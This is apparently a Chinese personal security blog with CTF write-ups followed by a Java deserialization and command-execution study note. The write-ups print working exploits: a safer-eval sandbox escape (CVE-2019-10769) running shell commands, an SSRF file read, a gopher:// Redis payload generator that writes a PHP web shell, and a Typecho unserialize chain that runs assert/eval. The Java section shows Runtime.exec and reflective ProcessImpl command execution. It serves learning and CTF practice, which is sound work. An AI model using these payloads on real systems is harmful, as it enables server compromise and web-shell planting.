<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">必需。要被解析的字符串。</td>
</tr>
<tr>
<td align="left">radix</td>
<td align="left">可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。</td>
</tr>
</tbody></table>
<p>这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试：</p>
<p><img src="..%5Cimages%5Cimage-20201027214654296.png" alt="image-20201027214654296"></p>
<p>发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>

<p>其中核心代码就是theFunction，我们传入进去污染参数即可执行代码</p>
<p><img src="image-20201028121332238.png" alt="image-20201028121332238"></p>
<h1 id="4-EzWeb"><a href="#4-EzWeb" class="headerlink" title="4.EzWeb"></a>4.EzWeb</h1><p>是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret</p>
<p><img src="image-20201028124819584.png" alt="image-20201028124819584"></p>
<p>查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容</p>
<p><img src="image-20201028125140003.png" alt="image-20201028125140003"></p>
<p>访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码：</p>
<p>file:[空格]/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--?secret--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化</p>
<p><img src="image-20201028132212757.png" alt="image-20201028132212757"></p>
<p>让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口</p>
<p>6379上得到：</p>
<p><img src="image-20201028132532651.png" alt="image-20201028132532651"></p>
<p>发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们改一下主机IP为:10.160.187.11</p>
<p>得到payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<h1 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h1><p>这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html</span><br></pre></td></tr></table></figure>

<p>exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况</p>
<p><img src="image-20201028171811386.png" alt="image-20201028171811386"></p>
<p>这个时候就必须看源码了</p>
<p>查找session，在源码中可以找到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line">               <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no, you can\&#x27;t unserialize it without session QAQ&#x27;</span>);&#125;</span><br><span class="line">               $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">               Typecho_Cookie::delete(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line">               $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">               $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line">               Typecho_Db::set($db);</span><br><span class="line">               <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们去查找sesion在哪里赋值：</p>
<p><img src="image-20201028172113525.png" alt="image-20201028172113525"></p>
<p>结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">                        $type = explode(<span class="string">&#x27;_&#x27;</span>, $config[<span class="string">&#x27;adapter&#x27;</span>]);</span><br><span class="line">                        $type = array_pop($type);</span><br></pre></td></tr></table></figure>

<p>发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">&quot;RSS 2.0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;link&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="string">&quot;20190430&quot;</span>,</span><br><span class="line">                <span class="string">&quot;author&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">            ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;screenName&quot;</span> =&gt; <span class="string">&quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">&quot;assert&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;adapter&quot;</span> =&gt; $a,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>

<p>拿到flag：</p>
<p><img src="image-20201028172325171.png" alt="image-20201028172325171"></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>​    题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。</p>
]]></content>
  </entry>
  <entry>
    <title>JavaSerialize</title>
    <url>/2020/11/02/JavaSerialize/</url>
    <content><![CDATA[<p>JAVA当中对于文件的处理都是通过IO流进行操作的</p>
<h1 id="一些IO流的API"><a href="#一些IO流的API" class="headerlink" title="一些IO流的API"></a>一些IO流的API</h1><ul>
<li>FileOutputStream  写入流，我们用该流可以写入内容到文件当中</li>
<li>FileInputStream   读取流</li>
<li>ObjectOutputStream 该流可以将一个对象写出，或者读取一个对象到程序中，也就是执行了序列化和反序列化操作。</li>
<li>ObjectInputStream  反序列化并打印数据</li>
</ul>
<h1 id="JAVA反序列化过程"><a href="#JAVA反序列化过程" class="headerlink" title="JAVA反序列化过程"></a>JAVA反序列化过程</h1><p>首先我们要明白，Java的序列化与反序列化的过程是如何产生的，我们可以编写如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String obj = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将序列化对象写入文件aa.ser中</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// aa.ser中读取数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反序列化恢复对象obj,注意这里使用强转</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这串代码，我们将数据ls传入到了aa.ser当中，并且将其重新释放了出来。我们成功通过写入序列化文件并将其成功返回。</p>
<p>实现Serializable和Externalizable接口的类的对象才能被序列化。故我们写一个例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setAge(<span class="number">19</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;sakani&quot;</span>);</span><br><span class="line">      <span class="comment">//  person.setSex(true);</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//因为文件可能不存在，此时需要处理异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person <span class="title">UnSerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        读取文件</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line"><span class="comment">//        到这一步来读取了文件流，下一步将其强转回对象</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"><span class="comment">//        readObject 是用来读取该流当中的对象</span></span><br><span class="line">        Person person2 =  (Person)objectInputStream.readObject();</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line">        <span class="keyword">return</span> person2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        SerializePerson();</span><br><span class="line"><span class="comment">//        这个方法用于序列化函数</span></span><br><span class="line">        Person person2 = UnSerializePerson();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,person2.getName(),person2.getAge()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须要实现序列化接口才可以进行序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">boolean</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java命令执行函数"><a href="#Java命令执行函数" class="headerlink" title="Java命令执行函数"></a>Java命令执行函数</h1><h2 id="1-java-lang-Runtime"><a href="#1-java-lang-Runtime" class="headerlink" title="1.java.lang.Runtime"></a>1.java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        Process start = runtime.exec(<span class="string">&quot;ping sakani.top&quot;</span>);</span><br><span class="line">        InputStream inputStream = start.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(res,<span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，第一种方式告诉我们可以用数组来传入命令，第二种则是告诉字符串的方式，第四种则是意味着我们可以执行反弹shell,但是用该方法的时候我只得到了一条ping的数据，如图所示，所以我认为可能并不是很靠谱</p>
<p><img src="image-20201103201813595.png" alt="image-20201103201813595"></p>
<h2 id="2-java-lang-ProcessBuilder"><a href="#2-java-lang-ProcessBuilder" class="headerlink" title="2.java.lang.ProcessBuilder"></a>2.java.lang.ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    Process start = processBuilder.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe &quot;</span>,<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">    processBuilder.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法也可以成功执行函数，但需要注意的是，使用的时候需要指定两个参数，第一个是执行什么文件，第二个才是命令</p>
<h2 id="3-java-lang-Processlmpl"><a href="#3-java-lang-Processlmpl" class="headerlink" title="3.java.lang.Processlmpl"></a>3.java.lang.Processlmpl</h2><p>这种方法是ProcessBuilder的父类，但是因为其为私有类，我们需要获取的时候只能通过反射的方式来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">    Method start = aClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">    start.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    start.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我比较疑惑的是这里为什么没有使用cmd，直接使用的null，却可以成功得到运行呢？</p>
<p>稍微审计了以下源码，看到了如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Process <span class="title">start</span><span class="params">(String cmdarray[],   //注意这里，传入的就是cmdarray</span></span></span><br><span class="line"><span class="function"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span></span><br><span class="line"><span class="function"><span class="params">                     String dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>顺便补充一下反射的几个知识：</p>
<ul>
